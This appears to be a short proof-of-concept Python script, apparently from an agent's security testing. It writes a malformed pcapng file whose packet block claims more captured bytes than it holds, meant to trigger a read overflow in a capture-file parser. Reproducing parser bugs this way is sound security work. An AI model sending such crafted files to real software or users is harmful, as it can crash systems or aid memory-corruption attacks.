import struct, pathlib
# minimal pcapng with malformed EPB captured length > actual bytes to trigger memcpy read overflow
shb_type=0x0A0D0D0A
idb_type=0x00000001
epb_type=0x00000006

def blk(t, body):
    total=12+len(body)
    pad=(4-total%4)%4
    total+=pad
    return struct.pack('<II', t, total)+body+b'\x00'*pad+struct.pack('<I', total)

shb_body=struct.pack('<IHHq', 0x1A2B3C4D, 1, 0, -1)
shb=blk(shb_type, shb_body)
idb_body=struct.pack('<HHI', 1, 0, 65535)
idb=blk(idb_type, idb_body)
# EPB: interface 0, ts hi/lo, captured len 64, orig len 64, but only 4 bytes packet data
body=struct.pack('<IIIIII', 0,0,0,64,64,0x41414141)[:24+4]
# easier: pack fields then 4 bytes data
body=struct.pack('<IIIIII', 0,0,0,64,64,0x41414141)
epb=blk(epb_type, body)
path=pathlib.Path('/workspace/poc.pcapng')
path.write_bytes(shb+idb+epb)
print(path, path.stat().st_size)
PY
